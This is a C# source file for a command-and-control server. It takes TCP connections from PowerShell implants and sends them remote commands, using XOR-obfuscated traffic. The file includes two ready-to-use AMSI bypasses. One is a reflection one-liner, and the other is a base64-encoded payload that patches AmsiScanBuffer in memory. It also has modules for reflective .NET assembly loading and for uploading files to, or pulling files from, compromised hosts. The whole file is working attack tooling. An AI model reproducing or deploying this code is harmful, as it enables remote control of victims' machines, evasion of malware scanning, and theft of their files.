using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace RFC_PwshRunspaceTCPC2
{
    public class Program
    {
        public static void Main(string[] args)
        {
            Server server = new Server();

            Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true;
                Console.WriteLine("\n\nCtrl+C intercepted. Enter exit to close.");
            };

            #region commandlinethread
            Thread commandlinethread = new Thread(() =>
            {
                while (true)
                {
                    Console.Write("#> ");
                    string command = Console.ReadLine();
                    if (string.IsNullOrEmpty(command))
                    {
                        continue;
                    }
                    else if (command.ToLower() == "exit" || command.ToLower() == "quit")
                    {
                        Environment.Exit(0);
                    }
                    else if (command.ToLower() == "help")
                    {
                        Console.WriteLine("exit/quit - exit the program");
                        Console.WriteLine("help - show this help");
                        Console.WriteLine("act <clientID> - set the active client");
                        Console.WriteLine("list - list all connected clients");

                    }
                    else if (command.ToLower().StartsWith("act"))
                    {
                        Server.clientID = command.Split(' ')[1];
                        Console.WriteLine($"Active client set to {Server.clientID}\n");
                        if (Server.client != null)
                        {
                            server.Interact();
                        }
                        else
                        {
                            Console.WriteLine("No active client. Enter list to see all connected clients.\n");
                        }
                    }
                    else if (Regex.Replace(command.ToString(), @"\s+", " ").Trim().ToLower() == "list")
                    {
                        server.List();
                    }
                    else if (Regex.Replace(command.ToString(), @"\s+", " ").Trim().ToLower() == "clear")
                    {
                        Console.Clear();
                    }
                    else
                    {
                        Console.WriteLine("Unknown command. Enter help for a list of commands.");
                    }
                }
            });

            #endregion

            commandlinethread.Start();
            server.Start();
        }
    }

    public class Server
    {
        #region variables
        public static IPAddress serverIP { get; set; } = IPAddress.Any;
        public static int serverPort { get; set; } = 443;
        public static TcpListener listener { get; private set; } = new TcpListener(serverIP, serverPort);
        public static TcpClient client { get; private set; }
        public static NetworkStream networkStream { get; private set; }
        public static string clientID { get; set; }

        private static Dictionary<string, TcpClient> clients = new Dictionary<string, TcpClient>();
        private static Dictionary<string, NetworkStream> clientStreams = new Dictionary<string, NetworkStream>();

        private static int currentID { get; set; } = 0;
        private string generateNewID()
        {
            currentID++;
            return currentID.ToString();
        }

        bool interact = true;

        #endregion

        #region methods
        public void Start()
        {
            listener.Start();

            while (true)
            {
                client = listener.AcceptTcpClient();
                networkStream = client.GetStream();
                clientID = generateNewID();
                clients.Add(clientID, client);
                clientStreams.Add(clientID, networkStream);
                Console.WriteLine($"Client connected: {((IPEndPoint)client.Client.RemoteEndPoint).ToString()} - session {clientID} opened");
            }
        }

        public void Stop()
        {
            listener.Stop();
        }

        public void List()
        {
            if (clients?.Count > 0)
            {
                Console.WriteLine("\nID\tIP\t\tPort");
                Console.WriteLine("--\t--\t\t----");
                foreach (var item in clients)
                {
                    Console.WriteLine($"{item.Key}\t{((IPEndPoint)item.Value.Client.RemoteEndPoint).Address}\t{((IPEndPoint)item.Value.Client.RemoteEndPoint).Port}");
                }
                Console.WriteLine();
            }
            else
            {
                Console.WriteLine("\nNo clients connected.\n");
            }
        }

        public void Interact()
        {
            if (string.IsNullOrEmpty(clientID))
            {
                Console.WriteLine("No active client set. Use act <clientID> to set the active client.");
                return;
            }

            interact = true;

            while (interact)
            {
                try
                {
                    string prompt = SendCommand("$hostname = $env:COMPUTERNAME; $cwd = (Invoke-Expression -Command \"&{Get-Location | Select-Object -ExpandProperty Path}\"); \"PS [$hostname] $cwd> \"");
                    Console.Write($"{Regex.Replace(prompt.ToString(), @"\s+", " ").Trim()} ");
                }
                catch (Exception)
                {

                    throw;
                }

                string command = Console.ReadLine();

                if (string.IsNullOrEmpty(command))
                {
                    continue;
                }
                else
                {
                    switch (command)
                    {
                        case "exit":
                        case "quit":
                            interact = false;
                            break;
                        case string s when s.StartsWith("!help"):
                            Console.WriteLine("\n Availible commands:");
                            Console.WriteLine("----------------------\n");

                            Console.WriteLine("exit\t\t\tbackground and exit to c2 menu");
                            Console.WriteLine("!help\t\t\tshow this help");
                            Console.WriteLine("!list\t\t\tlist all connected clients");
                            Console.WriteLine("!clear\t\t\tclear console");
                            Console.WriteLine("!amsi <1,2>\t\tbypass AMSI. Default: 1 (1: simple amsiInitFailed, 2: patching AMSI.dll in memory)");
                            Console.WriteLine("\n!ps <scriptpath>\timport PowerShell script");
                            Console.WriteLine("!dotnet <binarypath>\treflective Load .NET assembly");
                            Console.WriteLine("!upload <remotefile>\tupload a file to the remote system");
                            Console.WriteLine("!download <localfile>\tdownload a file from the remote system");
                            Console.WriteLine();
                            break;
                        case string s when s.ToLower().StartsWith("!amsi"):
                            int amsiSelect = 0;
                            string amsiArgs = "";

                            try
                            {
                                amsiArgs = command.Split(' ')[1];
                                if (Regex.Replace(amsiArgs.ToString(), @"\s+", " ").Trim().ToLower() == "2")
                                {
                                    amsiSelect = 1;
                                }
                            }
                            catch (Exception)
                            {
                                Console.WriteLine("\nNo argument given. Defaulting to AMSI bypass 1.");
                            }

                            string[] amsiBypass = new string[] { "$a=[Ref].Assembly.GetTypes(); Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}}; $d=$c.GetFields('NonPublic,Static'); Foreach($e in $d) {if ($e.Name -like \"*InitFailed\") {$f=$e}}; $g=$f.SetValue($null,$true)", "$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"ZgB1AG4AYwB0AGkAbwBuACAAZwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACAAewAKACAAIAAgACAAUABhAHIAYQBtACAAKAAKACAAIAAgACAAIAAgACAAIABbAE8AdQB0AHAAdQB0AFQAeQBwAGUAKABbAEkAbgB0AFAAdAByAF0AKQBdAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoACAAUABvAHMAaQB0AGkAbwBuACAAPQAgADAALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQApAF0ACgAgACAAIAAgACAAIAAgACAAWwBTAHQAcgBpAG4AZwBdAAoAIAAgACAAIAAgACAAIAAgACQAbQBvAGQAdQBsAGUATgBhAG0AZQAsACAACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAIABQAG8AcwBpAHQAaQBvAG4AIAA9ACAAMQAsACAATQBhAG4AZABhAHQAbwByAHkAIAA9ACAAJAB0AHIAdQBlACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdAByAGkAbgBnAF0ACgAgACAAIAAgACAAIAAgACAAJABmAHUAbgBjAHQAaQBvAG4ATgBhAG0AZQAKACAAIAAgACAAKQAKAAoAIAAgACAAIAAjACAARwBlAHQAIAByAGUAZgBlAHIAZQBuAGMAZQAgAHQAbwAgAFMAeQBzAHQAZQBtAC4AZABsAGwAIABpAG4AIAB0AGgAZQAgAEcAQQBDAAoAIAAgACAAIAAkAHMAeQBzAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQQBwAHAARABvAG0AYQBpAG4AXQA6ADoAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgAuAEcAZQB0AEEAcwBzAGUAbQBiAGwAaQBlAHMAKAApACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAKACAAIAAgACAAIAAgACAAIAAkAF8ALgBHAGwAbwBiAGEAbABBAHMAcwBlAG0AYgBsAHkAQwBhAGMAaABlACAALQBhAG4AZAAgACQAXwAuAEwAbwBjAGEAdABpAG8AbgAuAFMAcABsAGkAdAAoACcAXABcACcAKQBbAC0AMQBdACAALQBlAHEAIAAnAFMAeQBzAHQAZQBtAC4AZABsAGwAJwAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAkAHQAeQBwAGUAcwAgAD0AIAAkAHMAeQBzAGEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAcwAoACkACgAgACAAIAAgACQAdQBuAHMAYQBmAGUAbgBhAHQAaQB2AGUAbQBlAHQAaABvAGQAcwAgAD0AIABGAG8AcgBFAGEAYwBoACAAKAAkAHQAeQBwAGUAIABpAG4AIAAkAHQAeQBwAGUAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAHQAeQBwAGUAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACQAXwAuAEYAdQBsAGwATgBhAG0AZQAgAC0AbABpAGsAZQAgACcAKgBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzACcAIAAtAGEAbgBkACAAJABfAC4ARgB1AGwAbABuAGEAbQBlACAALQBsAGkAawBlACAAJwAqAFcAaQBuADMAMgAqACcAIAAtAGEAbgBkACAAJABfAC4ARgB1AGwAbABuAGEAbQBlACAALQBsAGkAawBlACAAJwAqAFUAbgAqACcAfQAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAjACAARwBlAHQAIAByAGUAZgBlAHIAZQBuAGMAZQAgAHQAbwAgAEcAZQB0AE0AbwBkAHUAbABlAEgAYQBuAGQAbABlACAAYQBuAGQAIABHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAIABtAGUAdABoAG8AZABzAAoAIAAgACAAIAAkAG0AbwBkAHUAbABlAGgAYQBuAGQAbABlACAAPQAgACQAdQBuAHMAYQBmAGUAbgBhAHQAaQB2AGUAbQBlAHQAaABvAGQAcwAuAEcAZQB0AE0AZQB0AGgAbwBkAHMAKAApACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBOAGEAbQBlACAALQBsAGkAawBlACAAJwAqAEgAYQBuAGQAbABlACcAIAAtAGEAbgBkACAAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACcAKgBNAG8AZAB1AGwAZQAqACcAfQAKACAAIAAgACAAJABwAHIAbwBjAGEAZABkAHIAZQBzAHMAIAA9ACAAJAB1AG4AcwBhAGYAZQBuAGEAdABpAHYAZQBtAGUAdABoAG8AZABzAC4ARwBlAHQATQBlAHQAaABvAGQAcwAoACkAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACQAXwAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAnACoAQQBkAGQAcgBlAHMAcwAnACAALQBhAG4AZAAgACQAXwAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAnACoAUAByAG8AYwAqACcAfQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBGAGkAcgBzAHQAIAAxAAoACgAgACAAIAAgACMAIABHAGUAdAAgAGgAYQBuAGQAbABlACAAbwBuACAAbQBvAGQAdQBsAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAKACAAIAAgACAAJABtAG8AZAB1AGwAZQAgAD0AIAAkAG0AbwBkAHUAbABlAGgAYQBuAGQAbABlAC4ASQBuAHYAbwBrAGUAKAAkAG4AdQBsAGwALAAgAEAAKAAkAG0AbwBkAHUAbABlAE4AYQBtAGUAKQApAAoAIAAgACAAIAAkAHAAcgBvAGMAYQBkAGQAcgBlAHMAcwAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAIABAACgAJABtAG8AZAB1AGwAZQAsACAAJABmAHUAbgBjAHQAaQBvAG4ATgBhAG0AZQApACkACgB9AAoACgBmAHUAbgBjAHQAaQBvAG4AIABnAGUAdABEAGUAbABlAGcAYQB0AGUAVAB5AHAAZQAgAHsACgAKAAkAUABhAHIAYQBtACAAKAAKAAkACQBbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADAALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAVAByAHUAZQApAF0AIABbAFQAeQBwAGUAWwBdAF0AIAAkAGYAdQBuAGMALAAKAAkACQBbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADEAKQBdACAAWwBUAHkAcABlAF0AIAAkAGQAZQBsAFQAeQBwAGUAIAA9ACAAWwBWAG8AaQBkAF0ACgAJACkACgAKAAkAJAB0AHkAcABlACAAPQAgAFsAQQBwAHAARABvAG0AYQBpAG4AXQA6ADoAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgAuAAoAIAAgACAAIABEAGUAZgBpAG4AZQBEAHkAbgBhAG0AaQBjAEEAcwBzAGUAbQBiAGwAeQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACgAJwBSAGUAZgBsAGUAYwB0AGUAZABEAGUAbABlAGcAYQB0AGUAJwApACkALAAgAAoAIAAgACAAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEUAbQBpAHQALgBBAHMAcwBlAG0AYgBsAHkAQgB1AGkAbABkAGUAcgBBAGMAYwBlAHMAcwBdADoAOgBSAHUAbgApAC4ACgAgACAAIAAgACAAIABEAGUAZgBpAG4AZQBEAHkAbgBhAG0AaQBjAE0AbwBkAHUAbABlACgAJwBJAG4ATQBlAG0AbwByAHkATQBvAGQAdQBsAGUAJwAsACAAJABmAGEAbABzAGUAKQAuAAoAIAAgACAAIAAgACAARABlAGYAaQBuAGUAVAB5AHAAZQAoACcATQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlACcALAAgACcAQwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwAnACwAIAAKACAAIAAgACAAIAAgAFsAUwB5AHMAdABlAG0ALgBNAHUAbAB0AGkAYwBhAHMAdABEAGUAbABlAGcAYQB0AGUAXQApAAoACgAgACAAJAB0AHkAcABlAC4ACgAgACAAIAAgAEQAZQBmAGkAbgBlAEMAbwBuAHMAdAByAHUAYwB0AG8AcgAoACcAUgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjACcALAAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAHMAXQA6ADoAUwB0AGEAbgBkAGEAcgBkACwAIAAkAGYAdQBuAGMAKQAuAAoAIAAgACAAIAAgACAAUwBlAHQASQBtAHAAbABlAG0AZQBuAHQAYQB0AGkAbwBuAEYAbABhAGcAcwAoACcAUgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAAnACkACgAKACAAIAAkAHQAeQBwAGUALgAKACAAIAAgACAARABlAGYAaQBuAGUATQBlAHQAaABvAGQAKAAnAEkAbgB2AG8AawBlACcALAAgACcAUAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsACcALAAgACQAZABlAGwAVAB5AHAAZQAsACAAJABmAHUAbgBjACkALgAKACAAIAAgACAAIAAgAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKAAnAFIAdQBuAHQAaQBtAGUALAAgAE0AYQBuAGEAZwBlAGQAJwApAAoACgAJAHIAZQB0AHUAcgBuACAAJAB0AHkAcABlAC4AQwByAGUAYQB0AGUAVAB5AHAAZQAoACkACgB9AAoACgAkAGEAbgBzAGkAIAA9ACAAIgBhACIAKwAiAG0AcwBpAC4AIgArACIAZABsAGwAIgAKACQAcwBiACAAPQAgACIAQQBtAHMAaQAiACAAKwAgACIAUwBjAGEAbgAiACAAKwAgACIAQgB1AGYAZgBlAHIAIgAKACQAcwBiAEEAZABkAHIAIAA9ACAAZwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACAAJABhAG4AcwBpACAAJABzAGIACgAKACQAdgBwAEEAZABkAHIAIAA9ACAAZwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACAAJwBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAnACAAJwBWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAJwAKACQAdgBwAEQAZQBsAGUAZwBhAHQAZQAgAD0AIABnAGUAdABEAGUAbABlAGcAYQB0AGUAVAB5AHAAZQAgAEAAKABbAEkAbgB0AFAAdAByAF0ALAAgAFsAVQBJAG4AdABQAHQAcgBdACwAIABbAFUASQBuAHQAMwAyAF0ALAAgAFsAVQBJAG4AdAAzADIAXQAuAE0AYQBrAGUAQgB5AFIAZQBmAFQAeQBwAGUAKAApACkAIABCAG8AbwBsAGUAYQBuAAoAJABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoARwBlAHQARABlAGwAZQBnAGEAdABlAEYAbwByAEYAdQBuAGMAdABpAG8AbgBQAG8AaQBuAHQAZQByACgAJAB2AHAAQQBkAGQAcgAsACAAJAB2AHAARABlAGwAZQBnAGEAdABlACkACgAKACQAcAAgAD0AIAAwAAoAJABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQALgBJAG4AdgBvAGsAZQAoACQAcwBiAEEAZABkAHIALAAgAFsAdQBpAG4AdAAzADIAXQA1ACwAIAAwAHgANAAwACwAIABbAHIAZQBmAF0AJABwACkACgAkAHAAYgAgAD0AIABbAEIAeQB0AGUAWwBdAF0AIAAoADEAOAA0ACwAIAA4ADcALAAgADAALAAgADcALAAgADEAMgA4ACwAIAAxADkANQApAAoAJABzAHkAcwB0AGUAbQAgAD0AIAAiAFsAUwB5AHMAdABlAG0AIgAKACQAcgBpACAAPQAgACIAUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzACIACgAkAG0AYQByAHMAaABhAGwAIAA9ACAAIgBNAGEAcgBzAGgAYQBsAF0AIgAKACQAYwBvAHAAeQAgAD0AIAAiADoAOgBDAG8AcAB5ACIACgAKAGkAZQB4ACAAKAAkAHMAeQBzAHQAZQBtACAAKwAgACIALgAiACAAKwAgACQAcgBpACAAKwAgACIALgAiACAAKwAgACQAbQBhAHIAcwBoAGEAbAAgACsAIAAkAGMAbwBwAHkAIAArACAAIgAoAGAAJABwAGIALAAgADAALAAgAGAAJABzAGIAQQBkAGQAcgAsACAANgApACIAKQAKAA==\")); Invoke-Expression -Command $x" };

                            Console.WriteLine("\nAttempting to bypass AMSI!\n");
                            SendCommand(amsiBypass[amsiSelect]);
                            break;
                        case string s when s.ToLower().StartsWith("!download"):
                            string[] downloadArgs = command.Split(' ');
                            if (downloadArgs.Length != 2)
                            {
                                Console.WriteLine("Usage: !download <remote file>");
                                break;
                            }
                            else
                            {
                                string remoteFile = downloadArgs[1];
                                remoteFile = remoteFile.Replace("\"", "");

                                Console.WriteLine($"\nAttempting to download {remoteFile}!");
                                string downloadCommand = $"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"{remoteFile}\"))";
                                string base64File = SendCommand(downloadCommand);
                                byte[] fileBytes = Convert.FromBase64String(base64File);

                                string localFile = Path.GetFileName(remoteFile);
                                File.WriteAllBytes(localFile, fileBytes);
                                Console.WriteLine($"\n[+] File saved to {Path.GetFullPath(localFile)}\n");
                            }
                            break;
                        case string s when s.ToLower().StartsWith("!upload"):
                            string[] uploadArgs = command.Split(' ');
                            if (uploadArgs.Length != 2)
                            {
                                Console.WriteLine("Usage: !upload <local file>");
                                break;
                            }
                            else
                            {
                                string localFile = uploadArgs[1];
                                localFile = localFile.Replace("\"", "");

                                if (File.Exists(localFile))
                                {
                                    byte[] fileBytes = File.ReadAllBytes(localFile);
                                    string base64File = Convert.ToBase64String(fileBytes);
                                    string localFileName = Path.GetFileName(localFile);
                                    // get size of file for debug console output
                                    long fileSize = new FileInfo(localFile).Length;
                                    Console.WriteLine($"\n[+] Attempting to upload {localFileName} ({fileSize} bytes)!\n");
                                    string uploadCommand = $"[System.IO.File]::WriteAllBytes(\"{localFileName}\", [System.Convert]::FromBase64String(\"{base64File}\"))";
                                    SendCommand(uploadCommand);
                                }
                                else
                                {
                                    Console.WriteLine("Local file does not exist!");
                                }
                            }
                            break;
                        case string s when s.ToLower().StartsWith("!ps"):
                            string[] psArgs = command.Split(' ');
                            if (psArgs.Length != 2)
                            {
                                Console.WriteLine("Usage: !ps <scriptpath>");
                                break;
                            }
                            else
                            {
                                string scriptPath = psArgs[1];
                                scriptPath = scriptPath.Replace("\"", "");
                                if (File.Exists(scriptPath))
                                {
                                    Console.WriteLine($"\nAttempting to load {scriptPath}!\n");
                                    string scriptText = System.IO.File.ReadAllText(scriptPath);
                                    SendCommand(scriptText);
                                }
                                else
                                {
                                    Console.WriteLine("ScriptPath file does not exist!");
                                }
                            }
                            break;
                        case string s when s.ToLower().StartsWith("!dotnet"):
                            string[] dotnetArgs = command.Split(' ');
                            if (dotnetArgs.Length != 2)
                            {
                                Console.WriteLine("Usage: !dotnet <assemblypath>");
                                break;
                            }
                            else
                            {
                                string assemblyPath = dotnetArgs[1];
                                assemblyPath = assemblyPath.Replace("\"", "");
                                if (File.Exists(assemblyPath))
                                {
                                    byte[] assemblyBytes = System.IO.File.ReadAllBytes(assemblyPath);
                                    string assemblyB64 = Convert.ToBase64String(assemblyBytes);
                                    Console.WriteLine($"\nAttempting to load {assemblyPath}!\n");
                                    SendCommand($"$assemblybytes = [System.Convert]::FromBase64String(\"{assemblyB64}\")");
                                    SendCommand("$assembly = [System.Reflection.Assembly]::Load($assemblybytes)");
                                }
                                else
                                {
                                    Console.WriteLine("AssemblyPath file does not exist!");
                                }
                            }
                            break;
                        case string s when s.ToLower().StartsWith("!clear"):
                            Console.Clear();
                            break;
                        default:
                            string returnData = SendCommand(command);
                            Console.WriteLine();
                            Console.WriteLine(returnData);
                            break;
                    }
                }
            }
        }

        public string SendCommand(string command)
        {
            bool debug = false;

            try
            {
                #region send
                byte[] dataSizeBytesSend = BitConverter.GetBytes(command.Length);
                clientStreams[clientID].Write(dataSizeBytesSend, 0, dataSizeBytesSend.Length);
                clientStreams[clientID].Flush();

                if (debug)
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"[debug] Sent data size: {command.Length}");
                    Console.ResetColor();
                }

                // encrypting the data to send
                byte[] encryptedBytes = Encoding.UTF8.GetBytes(command);
                for (int i = 0; i < encryptedBytes.Length; i++)
                {
                    encryptedBytes[i] = (byte)(encryptedBytes[i] ^ 0xFF);
                }

                // send the data to server
                clientStreams[clientID].Write(encryptedBytes, 0, encryptedBytes.Length);
                clientStreams[clientID].Flush();
                #endregion

                #region receive
                // read the size of the data from server
                byte[] dataSizeBytes = new byte[sizeof(int)];
                clientStreams[clientID].Read(dataSizeBytes, 0, dataSizeBytes.Length);
                int dataSize = BitConverter.ToInt32(dataSizeBytes, 0);

                if (debug)
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"[debug] Received data size: {dataSize}");
                    Console.ResetColor();
                }

                // create a buffer to hold the received data
                int totalBytesRead = 0;
                byte[] buffer = new byte[dataSize];
                while (totalBytesRead < dataSize)
                {
                    int bytesRead = clientStreams[clientID].Read(buffer, totalBytesRead, buffer.Length - totalBytesRead);
                    totalBytesRead += bytesRead;
                }

                // decrypting the received data
                byte[] decryptedBytes = new byte[buffer.Length];
                for (int i = 0; i < buffer.Length; i++)
                {
                    decryptedBytes[i] = (byte)(buffer[i] ^ 0xFF);
                }

                // converting the decrypted bytes to string
                string receivedData = Encoding.UTF8.GetString(decryptedBytes, 0, decryptedBytes.Length);
                return receivedData;
                #endregion
            }
            catch (IOException ex)
            {
                interact = false;
                clients.Remove(clientID);
                clientStreams.Remove(clientID);
                client.Close();
                return $"Client disconnected: {ex.Message}\n";
            }

        }

        #endregion
    }
}
